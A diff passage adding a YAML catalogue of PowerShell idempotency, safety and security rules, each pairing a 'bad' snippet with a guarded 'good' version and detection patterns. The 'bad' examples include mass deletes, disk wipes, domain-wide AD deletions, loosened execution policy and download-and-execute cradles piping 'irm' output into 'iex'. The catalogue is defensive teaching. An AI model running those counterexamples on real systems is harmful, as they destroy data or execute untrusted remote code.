+            New-Item -Path $link -ItemType Junction -Value $target | Out-Null
+        }
+    }
+    elseif (-not $item) {
+        New-Item -Path $link -ItemType Junction -Value $target | Out-Null
+    }
+  rationale: Links encode a pointer that drifts independently of the link itself; convergence requires
+    comparing the resolved target, not merely catching the already-exists error, or reruns pin deployments
+    to stale releases.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - filesystem
+  - links
+  detection:
+    pattern: -ItemType[ ]+(Junction|SymbolicLink)
+- id: IDEM-013
+  category: idempotency
+  severity: medium
+  title: Skip certificate imports already present by thumbprint
+  description: The certificate store accepts repeated imports of the same certificate, so unguarded Import-Certificate
+    calls litter Cert drives with duplicate entries on every run. Compute the thumbprint from the source
+    file, search the target store for it, and import only when absent.
+  bad: |
+    Import-Certificate -FilePath 'C:\certs\internal-root.cer' -CertStoreLocation Cert:\LocalMachine\Root | Out-Null
+  good: |
+    $storePath = 'Cert:\LocalMachine\Root'
+    $certFile  = 'C:\certs\internal-root.cer'
+    $incoming = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certFile)
+    $present = Get-ChildItem -Path $storePath |
+        Where-Object { $_.Thumbprint -eq $incoming.Thumbprint }
+    if (-not $present) {
+        Import-Certificate -FilePath $certFile -CertStoreLocation $storePath | Out-Null
+    }
+  rationale: Thumbprints are the natural identity key for certificates; keyed existence checks keep the
+    store converged while blind imports accumulate indistinguishable duplicates that complicate expiry
+    audits.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - dedupe
+  - certificates
+  detection:
+    pattern: \bImport-Certificate\b
+- id: IDEM-014
+  category: idempotency
+  severity: medium
+  title: Update JSON config keys in place rather than appending duplicate keys
+  description: Text-level additions to JSON files corrupt structure or stack duplicate keys with undefined
+    reader behavior. Parse with ConvertFrom-Json, update the property when it exists and add it when it
+    does not, then serialize the whole document once so the file always holds exactly one authoritative
+    copy of each key.
+  bad: |
+    Add-Content -Path 'C:\ProgramData\MyApp\settings.json' -Value '"logLevel": "debug"'
+  good: |
+    $file   = 'C:\ProgramData\MyApp\settings.json'
+    $config = Get-Content -LiteralPath $file -Raw | ConvertFrom-Json
+    if ($config.PSObject.Properties['logLevel']) {
+        $config.logLevel = 'debug'
+    }
+    else {
+        $config | Add-Member -NotePropertyName 'logLevel' -NotePropertyValue 'debug'
+    }
+    $config | ConvertTo-Json -Depth 16 | Set-Content -LiteralPath $file -Encoding UTF8
+  rationale: Configuration is a map with unique keys; convergent tooling merges desired values into parsed
+    state, while append-style edits make reruns produce invalid or ambiguous documents that shift behavior
+    between runs.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - configuration
+  detection:
+    pattern: (Add-Content|Out-File)[^\n]*\.json
+- id: IDEM-015
+  category: idempotency
+  severity: high
+  title: Merge desired cloud tags instead of overwriting the tag collection
+  description: Provider tag APIs such as Set-AzVM replace the whole tag map, so assigning tags by wholesale
+    assignment wipes tags managed elsewhere on every run. Merge only the desired keys into the currently
+    observed tags, test for their presence first, and push an update solely when drift exists.
+  bad: |
+    $vm = Get-AzVM -ResourceGroupName 'rg-app' -Name 'vm-web01'
+    $vm.Tags = @{ deployedBy = 'bootstrap' }
+    Update-AzVM -ResourceGroupName 'rg-app' -VM $vm | Out-Null
+  good: |
+    $vm = Get-AzVM -ResourceGroupName 'rg-app' -Name 'vm-web01'
+    if (-not $vm.Tags) { $vm.Tags = @{} }
+    if (-not $vm.Tags.ContainsKey('deployedBy')) {
+        $vm.Tags['deployedBy'] = 'bootstrap'
+        Update-AzVM -ResourceGroupName 'rg-app' -VM $vm | Out-Null
+    }
+  rationale: Cloud label collections follow last-writer-wins replacement semantics; convergent automation
+    must union its keys with observed state or each rerun destroys co-existing cost, ownership, and policy
+    tagging.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - converge
+  - cloud
+  detection:
+    pattern: \bUpdate-Az(VirtualMachineScaleSetVM|VM)\b[^\n]*-VM\b
+- id: SAFE-001
+  category: safety
+  severity: critical
+  title: Resolve and filter delete targets before any Remove-Item call
+  description: Remove-Item fed wildcards or unscoped variables can match far more than intended, including
+    a drive root when a variable is empty. Enumerate candidates with Get-ChildItem, filter by name or
+    age, display the resolved list, preview with -WhatIf, and address final paths with -LiteralPath so
+    bracketed names cannot re-expand as wildcards.
+  bad: |-
+    # Wildcard delete driven by interpolation or a user-supplied path
+    Remove-Item "$env:TEMP\*.log" -Recurse -Force
+    Remove-Item "$path\*" -Force              # empty $path resolves to the drive root
+    Remove-Item 'C:\Temp\[Test]\*' -Force     # brackets are treated as wildcards, not literals
+  good: |-
+    # 1) Enumerate + filter FIRST  2) Display  3) -WhatIf preview  4) Literal-path delete
+    $dir   = 'C:\Logs\App'
+    $files = @(Get-ChildItem -LiteralPath $dir -File -Filter '*.log' |
+               Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) })
+    $files | Select-Object FullName, LastWriteTime          # show the operator every target
+    $files | Remove-Item -WhatIf                            # preview pass
+    if ($files.Count -gt 0 -and (Read-Host "Delete $($files.Count) files? type YES") -eq 'YES') {
+        foreach ($file in $files) { Remove-Item -LiteralPath $file.FullName -Force }
+    }
+  rationale: Unscoped wildcard deletes are the leading cause of catastrophic data loss; resolving targets
+    first turns an opaque glob into an auditable explicit list.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - destructive
+  - filesystem
+  - preview
+- id: SAFE-002
+  category: safety
+  severity: critical
+  title: Require scope proof and a confirmation gate for Remove-Item -Recurse -Force
+  description: 'Recursive forced deletion flattens whole trees in one call and cannot be undone. Prove
+    the scope first: resolve the literal path, reject protected roots, count and show the victims, wrap
+    the operation in ShouldProcess with High ConfirmImpact, and gate irreversible runs behind explicit
+    human confirmation.'
+  bad: |-
+    # Blind recursive force delete; nothing proves which tree is about to vanish
+    Remove-Item -Path $root -Recurse -Force -ErrorAction SilentlyContinue
+    if ($env:CI) { Remove-Item C:\BuildArtifacts -Recurse -Force }   # hardcoded, unguarded root
+  good: |-
+    function Remove-BuildTree {
+        [CmdletBinding(SupportsShouldProcess, ConfirmImpact = 'High')]
+        param([Parameter(Mandatory)][ValidateScript({ Test-Path -LiteralPath $_ -PathType Container })][string]$LiteralPath)
+
+        $resolved  = (Resolve-Path -LiteralPath $LiteralPath).ProviderPath
+        $protected = @('C:\', 'C:\Windows', 'C:\Program Files', "$env:SystemDrive\", $env:USERPROFILE)
+        if ($protected -contains $resolved.TrimEnd('\')) { throw "Scope proof failed: refusing protected path $resolved" }
+
+        $count = @(Get-ChildItem -LiteralPath $resolved -Recurse -File -ErrorAction Stop).Count
+        Write-Host "Will recursively delete $count files under $resolved"
+        if ($PSCmdlet.ShouldProcess($resolved, "Recursively delete $count items")) {
+            Remove-Item -LiteralPath $resolved -Recurse -Force -Confirm:$false
+        }
+    }
+    Remove-BuildTree -LiteralPath 'C:\BuildArtifacts\job-42' -WhatIf   # caller previews first
+  rationale: One typo under -Recurse -Force erases a volume; scope proof plus a two-step gate makes the
+    blast radius visible before bytes leave the disk.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - destructive
+  - recursion
+  - confirmation
+  detection:
+    psscriptanalyzer: PSUseShouldProcessForStateChangingFunctions
+- id: SAFE-003
+  category: safety
+  severity: high
+  title: Resolve and display process and service matches before stopping them
+  description: Loose -Name matching such as short prefixes or broad wildcards silently captures sibling
+    processes and services. Resolve candidate identities first, display id, name, path or host so the
+    operator sees exactly what matched, and stop only after explicit confirmation.
+  bad: |-
+    Stop-Process -Name 'update' -Force                    # also kills Updater, update-agent, ...
+    Get-Service -DisplayName '*agent*' | Stop-Service -Force -Confirm:$false   # halts every agent-like service
+  good: |-
+    # Processes: resolve, display, then stop only exact confirmed identities
+    $targets = @(Get-Process -Name 'Update' -ErrorAction SilentlyContinue |
+                 Select-Object Id, ProcessName, Path)
+    $targets | Format-Table -AutoSize                     # operator sees every match first
+    if (-not $targets) { Write-Host 'No processes matched.'; return }
+    if ((Read-Host "Stop $($targets.Count) processes listed above? type YES") -eq 'YES') {
+        $targets | Stop-Process -Force -Confirm:$false
+    }
+
+    # Services: echo identity and status before acting
+    $svc = Get-Service -Name 'WSearch' -ErrorAction Stop
+    Write-Host "Found service [$($svc.Name)] on $env:COMPUTERNAME with status $($svc.Status)"
+    if ((Read-Host "Stop service $($svc.Name)? type YES") -eq 'YES') { $svc | Stop-Service -Confirm }
+  rationale: A name like 'update' matches dozens of unrelated processes and '*agent*' can halt critical
+    services; displaying resolved matches prevents collateral shutdowns.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - process-control
+  - service-control
+  - preview
+- id: SAFE-004
+  category: safety
+  severity: high
+  title: Back up content before truncation with Clear-Content or empty writes
+  description: Clear-Content, piping an empty string into Set-Content, and .NET WriteAllText calls destroy
+    file contents instantly with no undo path. Take a timestamped copy first, preview with -WhatIf, and
+    surface the backup path in output so recovery remains possible.
+  bad: |-
+    Clear-Content -Path C:\Logs\app.log                        # contents gone instantly, no undo
+    '' | Set-Content -Path C:\inetpub\logs\u_ex.log            # sneaky truncation via empty write
+    [System.IO.File]::WriteAllText($path, '')                  # .NET side door skips provider safeguards
+  good: |-
+    $path   = 'C:\Logs\app.log'
+    $stamp  = Get-Date -Format 'yyyyMMdd-HHmmss'
+    $backup = "C:\Logs\archive\app.$stamp.log.bak"
+    New-Item -ItemType Directory -Path (Split-Path $backup) -Force | Out-Null
+    Copy-Item -LiteralPath $path -Destination $backup -ErrorAction Stop   # backup BEFORE truncating
+    Clear-Content -LiteralPath $path -WhatIf                              # preview the truncation
+    Clear-Content -LiteralPath $path
+    Write-Host "Original preserved at $backup"
+  rationale: Truncation is instantaneous and unrecoverable; a cheap pre-copy converts an unrecoverable
+    mistake into a rename.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - filesystem
+  - backup
+  - irreversible
+- id: SAFE-005
+  category: safety
+  severity: high
+  title: Guard Set-Content overwrites of existing files with backups or -NoClobber
+  description: Set-Content and Out-File overwrite existing files silently by default. When overwriting
+    is intentional, snapshot the previous version first; when creating is intended, pass -NoClobber so
+    an existing file aborts the write instead of being clobbered. Wrap repeatable writers in SupportsShouldProcess
+    functions.
+  bad: |-
+    $report | Set-Content C:\Reports\daily.csv        # silently clobbers yesterday's report
+    $body   | Out-File C:\Scripts\notify.json         # Out-File overwrites by default too
+  good: |-
+    function Save-ReportFile {
+        [CmdletBinding(SupportsShouldProcess)]
+        param(
+            [Parameter(Mandatory)][string]$LiteralPath,
+            [Parameter(Mandatory)][AllowEmptyString()][string]$Content
+        )
+        process {
+            if (Test-Path -LiteralPath $LiteralPath) {   # overwrite is deliberate, keep the old copy
+                $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
+                Copy-Item -LiteralPath $LiteralPath -Destination "$LiteralPath.$stamp.bak" -ErrorAction Stop
+            }
+            if ($PSCmdlet.ShouldProcess($LiteralPath, 'Overwrite')) {
+                Set-Content -LiteralPath $LiteralPath -Value $Content -Confirm:$false
+            }
+        }
+    }
+    # Create-new-only semantics stay declarative: this refuses to touch an existing file
+    $dest = 'C:\Exports\new-report.csv'
+    $rows | Set-Content -LiteralPath $dest -NoClobber -ErrorAction Stop
+  rationale: Silent overwrite destroys prior data with zero trace; explicit clobber decisions keep every
+    generation of the file recoverable.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - filesystem
+  - backup
+  - overwrite
+  detection:
+    psscriptanalyzer: PSUseShouldProcessForStateChangingFunctions
+- id: SAFE-006
+  category: safety
+  severity: critical
+  title: Confirm the node list and impact before Stop-Computer or Restart-Computer
+  description: Shutdown cmdlets fed dynamic lists or issued with -Force reboot machines with no visibility.
+    Materialize the node list from its source, exclude the local machine unless explicitly intended, test
+    reachability, display the impact table, and require typed confirmation while keeping the native -Confirm
+    prompt intact.
+  bad: |-
+    Restart-Computer -ComputerName (Get-Content .\servers.txt) -Force   # reboots whatever that file holds
+    Stop-Computer -Force                                                # drops the local machine immediately
+  good: |-
+    $nodes = @(Get-Content -LiteralPath .\servers.txt | Where-Object { $_ -and $_ -ne $env:COMPUTERNAME })
+    # Reachability check plus impact table BEFORE any shutdown call
+    $nodes | ForEach-Object {
+        [pscustomobject]@{ Node = $_; Reachable = (Test-Connection -ComputerName $_ -Count 1 -Quiet) }
+    } | Format-Table -AutoSize
+    if ((Read-Host "Restart $($nodes.Count) servers listed above? type YES") -ne 'YES') { return }
+    Restart-Computer -ComputerName $nodes -WsmanAuthentication Default -Confirm -ErrorAction Stop
+  rationale: An unchecked server list turns a maintenance script into an unplanned outage across every
+    host named in a text file.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - restart
+  - remote
+  - confirmation
+- id: SAFE-007
+  category: safety
+  severity: high
+  title: Warn on connectivity loss and honor confirmation for Disable-NetAdapter
+  description: Disabling a network adapter can sever remote sessions, cluster heartbeats, and management
+    access. List adapters with status and interface description, never disable by bare wildcard, warn
+    about the specific connectivity loss, and keep the cmdlet's native -Confirm prompt as a second gate.
+  bad: |-
+    Get-NetAdapter | Disable-NetAdapter -Confirm:$false     # severs every NIC including your session
+    Disable-NetAdapter -Name 'Ethernet*' -AsJob             # wildcard disable fired blindly in background
+  good: |-
+    $nics = @(Get-NetAdapter | Where-Object Status -eq 'Up' |
+              Select-Object Name, InterfaceDescription, ifIndex)
+    $nics | Format-Table -AutoSize                          # show exactly what would go dark
+    $nic = $nics | Where-Object InterfaceDescription -like '*I210*' | Select-Object -First 1
+    if (-not $nic) { throw 'Target adapter not found; refusing to guess.' }
+    Write-Warning "Disabling $($nic.Name) will drop all connectivity through that link."
+    if ((Read-Host "Disable adapter $($nic.Name)? type YES") -eq 'YES') {
+        Disable-NetAdapter -Name $nic.Name -Confirm         # native confirm kept as second gate
+    }
+  rationale: Disabling the wrong adapter locks operators out of the very machine needed to undo it; explicit
+    targeting and double confirmation prevent lockouts.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - network
+  - connectivity-loss
+  - confirmation
+- id: SAFE-008
+  category: safety
+  severity: critical
+  title: Refuse storage wipes without a verified explicit target
+  description: Clear-Disk, Format-Volume, and Initialize-Disk are point-of-no-return operations. Require
+    an explicit disk number or letter, display serial number, size, and partition style, compare the serial
+    against an operator-provided expected value, and demand a typed high-friction confirmation before
+    any wipe proceeds.
+  bad: |-
+    Get-Disk | Where-Object Number -eq $n | Clear-Disk -RemoveData -RemoveOEM -Confirm:$false
+    Format-Volume -DriveLetter $dl -FileSystem NTFS -Force -Confirm:$false   # $dl came from a loop variable
+  good: |-
+    $disk = Get-Disk -Number 3 -ErrorAction Stop     # explicit target only, never piped discovery
+    [pscustomobject]@{
+        Number         = $disk.Number
+        FriendlyName   = $disk.FriendlyName
+        SerialNumber   = $disk.SerialNumber
+        SizeGB         = [math]::Round($disk.Size / 1GB, 1)
+        PartitionStyle = $disk.PartitionStyle
+    } | Format-List                                   # verified target: operator reads hardware identity
+    $expected = Read-Host 'Paste the serial number you intend to wipe'
+    if ($disk.SerialNumber -ne $expected.Trim()) { throw 'Serial mismatch; refusing destructive wipe.' }
+    if ((Read-Host "IRREVERSIBLY wipe disk $($disk.Number)? type WIPE") -ne 'WIPE') { return }
+    Clear-Disk -Number $disk.Number -RemoveData -RemoveOEM -Confirm:$false
+    Initialize-Disk -Number $disk.Number -PartitionStyle GPT
+    New-Partition -DiskNumber $disk.Number -UseMaximumSize -AssignDriveLetter |
+        Format-Volume -FileSystem NTFS -NewFileSystemLabel 'DATA'
+  rationale: Storage wipes cannot be reversed by any tooling; verifying hardware identity by serial number
+    is the only reliable defense against wiping the wrong disk.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - storage-wipe
+  - irreversible
+  - confirmation
+- id: SAFE-009
+  category: safety
+  severity: high
+  title: Never loosen execution policy casually; scope to Process with justification
+  description: Set-ExecutionPolicy Unrestricted or Bypass at LocalMachine scope leaves a persistent security
+    hole just to make one script run. Prefer per-invocation -ExecutionPolicy Bypass on the interpreter
+    command line; when policy truly must change, limit it to Process scope, choose RemoteSigned, and record
+    the ticket and reason beside the change.
+  bad: |-
+    Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force   # machine-wide hole so one script runs
+    Set-ExecutionPolicy Bypass -Force                             # defaults to LocalMachine and persists
+  good: |-
+    # Preferred: per-invocation bypass dies with the process, touches nothing persistent
+    pwsh -NoProfile -ExecutionPolicy Bypass -File .\deploy.ps1
+
+    # If policy genuinely must change: Process scope only, least-permissive setting, justified
+    Set-ExecutionPolicy -Scope Process -ExecutionPolicy RemoteSigned -Force
+    Add-Content -LiteralPath .\OPS-LOG.md -Value "$(Get-Date -Format s) Process-scope RemoteSigned for deploy.ps1 (ticket OPS-142)"
+  rationale: Machine-wide policy loosening outlives the incident that motivated it and silently widens
+    attack surface; process-scoped changes expire with the session.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - security-policy
+  - blast-radius
+- id: SAFE-010
+  category: safety
+  severity: high
+  title: Export and archive account data before Remove-LocalUser
+  description: Deleting a local account discards its SID, profile folder, and membership history irreversibly.
+    Export the account attributes to XML, archive the profile directory, disable the account first as
+    a reversible step, then remove only after a typed confirmation.
+  bad: |-
+    Get-LocalUser | Where-Object Enabled -eq $false | Remove-LocalUser -Confirm:$false   # mass purge, no export
+    Remove-LocalUser -Name 'svc-temp'                                                    # SID and profile data lost
+  good: |-
+    $user = Get-LocalUser -Name 'svc-temp' -ErrorAction Stop
+    New-Item -ItemType Directory -Path .\removed-users -Force | Out-Null
+    # Export identity attributes BEFORE any destructive step
+    [pscustomobject]@{
+        Name        = $user.Name
+        SID         = $user.SID.Value
+        Description = $user.Description
+        LastLogon   = $user.LastLogon
+        Enabled     = $user.Enabled
+    } | Export-Clixml -Path ".\removed-users\$($user.SID.Value).xml"
+    # Archive the profile directory when it exists
+    if (Test-Path -LiteralPath "C:\Users\$($user.Name)") {
+        Compress-Archive -LiteralPath "C:\Users\$($user.Name)" -DestinationPath ".\removed-users\$($user.Name)-profile.zip"
+    }
+    Disable-LocalUser -Name $user.Name                    # reversible step first
+    if ((Read-Host "Permanently remove $($user.Name)? type REMOVE") -eq 'REMOVE') {
+        Remove-LocalUser -Name $user.Name -Confirm:$false
+    }
+  rationale: SID-linked ACLs and profile data break permanently on deletion; disable-first plus archived
+    artifacts keeps the operation recoverable until the final confirmed step.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - account-lifecycle
+  - backup
+  - confirmation
+- id: SAFE-011
+  category: safety
+  severity: high
+  title: Export registry keys before touching service startup or boot values
+  description: Service Start values and Winlogon-style boot keys decide whether systems come up healthy
+    at all. Export the containing key with reg.exe export before editing, fail closed if the export fails,
+    edit through precise literal paths with typed properties, and preview with -WhatIf before writing.
+  bad: |-
+    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\wuauserv -Name Start -Value 4   # no backup taken
+    reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer /v Start /t REG_DWORD /d 4 /f   # raw, unguarded
+  good: |-
+    $key          = 'HKLM:\SYSTEM\CurrentControlSet\Services\wuauserv'
+    $regPathForExport = $key -replace '^HKLM:', 'HKLM'
+    $exportFile   = "C:\RegistryBackups\wuauserv-$(Get-Date -Format yyyyMMdd-HHmmss).reg"
+    New-Item -ItemType Directory -Path (Split-Path $exportFile) -Force | Out-Null
+    & reg.exe export $regPathForExport $exportFile /y          # backup FIRST
+    if ($LASTEXITCODE -ne 0) { throw 'Registry export failed; aborting modification.' }
+    Set-ItemProperty -Path $key -Name Start -Value 4 -WhatIf    # preview the precise write
+    if ((Read-Host "Set wuauserv Start=4 Disabled? type YES") -eq 'YES') {
+        New-ItemProperty -Path $key -Name Start -PropertyType DWord -Value 4 -Force
+    }
+  rationale: A wrong Start value or mangled boot string can brick startup or logon with no in-place rollback
+    except a prior export.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - registry
+  - boot-critical
+  - backup
+- id: SAFE-012
+  category: safety
+  severity: high
+  title: Take a checkpoint before hard power operations on virtual machines
+  description: Stop-VM -TurnOff discards running memory state like pulling the plug. Enumerate running
+    VMs first, verify the target by exact name, capture a checkpoint when the platform supports it, then
+    perform a graceful stop; reserve -TurnOff for documented emergencies after confirmation.
+  bad: |-
+    Get-VM | Stop-VM -TurnOff -Force            # pulls the power on EVERY VM on the host
+    Stop-VM -Name 'db01' -TurnOff -Force        # running memory state discarded without a snapshot
+  good: |-
+    $vms = @(Get-VM | Where-Object State -eq 'Running' | Select-Object Name, Uptime)
+    $vms | Format-Table -AutoSize               # enumerate affected VMs first
+    $vmName = 'db01'
+    if ($vms.Name -notcontains $vmName) { throw "VM $vmName is not running; nothing to stop." }
+    Checkpoint-VM -Name $vmName -SnapshotName "pre-stop-$(Get-Date -Format yyyyMMdd-HHmmss)"  # rollback point
+    if ((Read-Host "Gracefully stop $vmName with checkpoint saved? type YES") -eq 'YES') {
+        Stop-VM -Name $vmName -Confirm:$false   # graceful shutdown; reserve -TurnOff for emergencies
+    }
+  rationale: Hard power events corrupt in-flight transactions and destroy unsaved state; a checkpoint
+    makes the destructive step reversible.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - virtualization
+  - checkpoint
+  - confirmation
+- id: SAFE-013
+  category: safety
+  severity: critical
+  title: Scope bulk Active Directory deletions to an OU with preview and recycle-bin awareness
+  description: Never pipe unfiltered Get-AD* results into Remove-AD*. Use -SearchBase scoped to an explicit
+    OU with server-side filters, export the pending victim list to CSV, preview with -WhatIf, require
+    typed confirmation, and verify the Active Directory Recycle Bin is enabled so deletions remain restorable.
+  bad: |-
+    Get-ADUser -Filter * | Remove-ADUser -Confirm:$false                    # deletes EVERY account in the domain
+    Get-ADOrganizationalUnit -Filter * | Remove-ADObject -Recursive -Confirm:$false   # flattens the whole tree
+  good: |-
+    Import-Module ActiveDirectory
+    $ou = 'OU=Contractors,DC=contoso,DC=com'
+    # Server-side filter, OU-scoped search base, age condition; NEVER -Filter *
+    $stale = @(Get-ADUser -SearchBase $ou -SearchScope OneLevel -Filter 'Enabled -eq $false' -Properties WhenChanged |
+               Where-Object { $_.WhenChanged -lt (Get-Date).AddMonths(-6) })
+    $stale | Select-Object SamAccountName, WhenChanged |
+        Export-Csv -LiteralPath .\pending-deletions.csv -NoTypeInformation   # evidence list first
+    $stale | Remove-ADUser -WhatIf                                            # preview pass
+    if ((Read-Host "Delete $($stale.Count) accounts from pending-deletions.csv? type YES") -eq 'YES') {
+        $stale | Remove-ADUser -Confirm:$false
+    }
+    # Recycle-bin awareness: confirm the feature is enabled so every delete stays restorable
+    Get-ADOptionalFeature -Filter 'Name -eq "Recycle Bin Feature"' |
+        Select-Object Name, EnabledScopes
+  rationale: Bulk AD deletions cascade through groups, mailboxes, and access grants domain-wide; OU scoping
+    plus CSV evidence and the recycle bin turn catastrophe into a restore job.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - active-directory
+  - bulk-delete
+  - preview
+- id: SAFE-014
+  category: safety
+  severity: critical
+  title: Guard subscription and resource-group context before Remove-AzResourceGroup or Remove-AzResource
+  description: Azure removals act on whatever context the session holds. Assert the expected subscription
+    id before acting, enumerate every resource inside the target group, save that inventory as a CSV audit
+    record, preview with -WhatIf, and demand a distinctive typed confirmation before the irreversible
+    call.
+  bad: |-
+    Remove-AzResourceGroup -Name $rg -Force                    # deletes the group and EVERY resource in it
+    Get-AzResource | Remove-AzResource -Force                  # acts on whatever the session context holds
+  good: |-
+    $expectedSubscriptionId = '00000000-0000-0000-0000-000000000000'
+    if ((Get-AzContext).Subscription.Id -ne $expectedSubscriptionId) {
+        Set-AzContext -Subscription $expectedSubscriptionId -ErrorAction Stop   # subscription guard FIRST
+    }
+    $rg        = 'rg-demo-prod'
+    $resources = @(Get-AzResource -ResourceGroupName $rg)
+    Write-Host "Deleting group $rg removes $($resources.Count) resources:"
+    $resources | Select-Object Name, ResourceType, Location | Format-Table -AutoSize
+    $resources | Export-Csv -LiteralPath ".\audit-$rg.csv" -NoTypeInformation  # inventory BEFORE deletion
+    Remove-AzResourceGroup -Name $rg -WhatIf                                    # preview pass
+    if ((Read-Host "IRREVERSIBLY delete resource group $rg? type DELETE") -eq 'DELETE') {
+        Remove-AzResourceGroup -Name $rg -Confirm:$false
+    }
+  rationale: One stale Az context points Remove-AzResourceGroup at production; subscription guards and
+    exported inventories are the only reliable post-mortem trail.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - azure
+  - resource-deletion
+  - preview
+- id: SAFE-015
+  category: safety
+  severity: high
+  title: Enumerate affected Azure VMs and confirm cost impact before Stop-AzVM deallocation
+  description: Stop-AzVM with -Force skips prompting and deallocates whatever the pipeline supplies. Query
+    VM status first, display the affected names and power states, state the cost model (deallocated stops
+    compute billing while disks keep billing), and confirm before stopping; prefer -StayProvisioned when
+    only an OS shutdown is intended.
+  bad: |-
+    Get-AzVM -ResourceGroupName rg-app | Stop-AzVM -Force    # force-deallocates every VM the pipeline finds
+    Stop-AzVM -ResourceGroupName $rg -Name $vm -Force        # -Force skips the confirmation prompt entirely
+  good: |-
+    $rg  = 'rg-app'
+    $vms = @(Get-AzVM -ResourceGroupName $rg -Status | Where-Object { $_.PowerState -eq 'VM running' })
+    $vms | Select-Object Name, PowerState | Format-Table -AutoSize   # enumerate affected VMs first
+    $target = $vms | Where-Object Name -eq 'vm-web-01'
+    if (-not $target) { throw 'Target VM not found or already stopped.' }
+    Write-Host "Deallocation stops compute billing; managed disks keep billing; public IP may change."
+    if ((Read-Host "Deallocate $($target.Name)? type YES") -eq 'YES') {
+        Stop-AzVM -ResourceGroupName $rg -Name $target.Name -Confirm:$false   # no -Force once confirmed
+    }
+    # OS shutdown only? Keep provisioning (and compute billing) instead of deallocating
+    Stop-AzVM -ResourceGroupName $rg -Name $target.Name -StayProvisioned -WhatIf
+  rationale: Deallocation silently changes public IPs and billing posture; enumerated targets plus a stated
+    cost impact prevent surprise outages and surprise invoices.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - azure
+  - vm-lifecycle
+  - cost
+- id: SEC-001
+  category: security
+  severity: critical
+  title: 'Deny dynamic code execution: Invoke-Expression, iex alias, & on strings, scriptblock creation'
+  description: Scripts must never turn runtime strings, interpolated values, or fetched content into executable
+    code. Invoke-Expression, its iex alias, invoking a variable that holds a command string with &, and
+    [scriptblock]::Create all dissolve the boundary between data and code, defeat static analysis, and
+    hand every upstream input a remote-code-execution primitive. Compliant scripts execute only version-controlled
+    files with explicit, typed parameters.
+  bad: |
+    $userCode = Read-Host 'Enter setup expression'
+    Invoke-Expression $userCode                 # arbitrary string becomes live code
+    iex (Get-Content .\bootstrap.txt -Raw)      # alias form, identical hazard
+    & $commandLine                              # & applied to a string variable executes it
+    [scriptblock]::Create($snippet).Invoke()    # compiles attacker-shaped text at runtime
+  good: |
+    # Data stays data: dispatch on enumerated operations and run only reviewed files.
+    function Invoke-KnownOperation {
+        param(
+            [Parameter(Mandatory)]
+            [ValidateSet('Init', 'Migrate', 'Verify')]
+            [string]$Operation,
+
+            [Parameter(Mandatory)]
+            [hashtable]$Settings
+        )
+        $scriptPath = Join-Path -Path $PSScriptRoot -ChildPath ('step-' + $Operation.ToLowerInvariant() + '.ps1')
+        if (-not (Test-Path -LiteralPath $scriptPath)) {
+            throw "Refusing to run: '$scriptPath' is not a reviewed script shipped with this module."
+        }
+        & $scriptPath -Settings $Settings
+    }
+  rationale: Dynamic evaluation hides the real call graph from reviewers, transcripts, and PSScriptAnalyzer,
+    and cannot be constrained by JEA roles or application allow-listing. Explicit files and parameters
+    preserve provenance, reviewability, and auditability.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - security
+  - dynamic-execution
+  detection:
+    psscriptanalyzer: PSAvoidUsingInvokeExpression
+- id: SEC-002
+  category: security
+  severity: critical
+  title: No download-and-execute cradles through Invoke-WebRequest or Invoke-RestMethod
+  description: 'Piping a web response straight into Invoke-Expression, or letting a URL body flow down
+    the pipeline into execution, is the canonical cradle. The required shape is: materialize the payload
+    to a file, verify a pinned SHA256 hash and signature, inspect what will run, and only then execute
+    the verified file.'
+  bad: |
+    irm https://tools.example.tld/bootstrap.ps1 | iex
+    Invoke-RestMethod -Uri $installerUrl | Invoke-Expression
+    Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content | iex
+  good: |
+    $outFile = Join-Path -Path $env:TEMP -ChildPath 'bootstrap.ps1'
+    Invoke-WebRequest -Uri $SourceUrl -OutFile $outFile -UseBasicParsing
+    if ((Get-FileHash -Path $outFile -Algorithm SHA256).Hash -ne $ExpectedSha256) {
+        throw "Integrity check failed for $outFile."
+    }
+    # Inspect before running: refuse payloads that themselves perform dynamic execution.
+    if ((Get-Content -Path $outFile -Raw) -match '(?m)\biex\b|Invoke-Expression') {
+        throw 'Downloaded script contains dynamic execution; manual security review required.'
+    }
+    & $outFile
+  rationale: Memory-resident execution leaves no artifact to scan, hash, or audit and runs whatever the
+    endpoint happens to serve at that moment. A verified file on disk gives defenders a sample and gives
+    operators a reviewable diff between versions.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - security
+  - download-execute
+- id: SEC-003
+  category: security
+  severity: critical
+  title: WebClient DownloadString/DownloadData output must never feed Invoke-Expression
+  description: Handing System.Net.WebClient.DownloadString or DownloadData results to iex runs fetched
+    bytes in-process with full user rights and leaves no on-disk artifact. Fetched payloads must land
+    on disk, pass pinned-hash and signature verification, be inspected, and then run as a file.
+  bad: |
